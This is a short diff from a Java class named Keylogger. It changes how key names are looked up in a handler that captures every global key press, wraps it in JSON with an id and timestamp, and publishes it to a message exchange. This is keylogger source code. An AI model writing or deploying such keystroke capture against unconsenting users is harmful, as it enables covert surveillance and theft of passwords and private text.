@@ -24,7 +24,7 @@ public class Keylogger implements NativeKeyListener{
   @Override
   public void nativeKeyPressed(NativeKeyEvent nativeEvent){
     try {
-      String key = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
+      String key = MyKeyEvent.getKeyText(nativeEvent.getKeyCode());
       int id = 1; // Because we don't have login yet
       String payload = String.format("{\"author\": {\"id\" : \"%d\"},\"pressedKey\": \"%s\", \"ts\": \"%s\"}", id, key, new Timestamp(System.currentTimeMillis()).toString());
       channel.basicPublish(EXCHANGE_NAME,"",null,payload.getBytes());
